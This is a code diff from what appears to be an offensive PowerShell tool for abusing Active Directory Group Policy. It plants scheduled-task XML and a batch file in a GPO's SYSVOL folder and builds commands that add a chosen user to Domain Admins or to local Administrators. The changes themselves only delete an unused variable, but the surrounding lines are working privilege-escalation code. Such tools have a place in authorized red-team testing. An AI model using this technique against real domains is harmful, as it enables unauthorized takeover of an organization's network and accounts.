@@ -228,7 +228,7 @@ Parameters:
         Copy-Item $SecondTaskXMLPath "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
         Copy-Item add.bat "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\add.bat" -Force 2>&1>$null
         $green+" Created wsadd.xml and add.bat files in SYSVOL!"
-        $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
+        
         $boundary = (Get-Date).AddHours(24).ToString("s")
         
         # Modify the SecondTask XML file with the provided command or PowerShell script
@@ -295,7 +295,6 @@ Parameters:
         }
         }
         $dacommand = '/r net group "Domain Admins" '+$User+' /add /dom'
-        $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -327,7 +326,7 @@ Parameters:
         }
         }
         $localcommand = '/r net localgroup Administrators '+$User+' /add'
-        $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
+        
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -353,7 +352,7 @@ Parameters:
         }
     } else {
         if($SecondTaskXMLPath){
-            $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
+            
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -381,7 +380,7 @@ Parameters:
             } elseif(($PowerShell.StartsWith("-Command "))){
                 $PowerShell = $PowerShell.replace("-Command ","")
         }
-        $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
+        
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -417,7 +416,7 @@ Parameters:
         } elseif(($CMD.StartsWith("/r "))){
             $CMD = $CMD.replace("/r ","")
         }
-        $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
+        
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
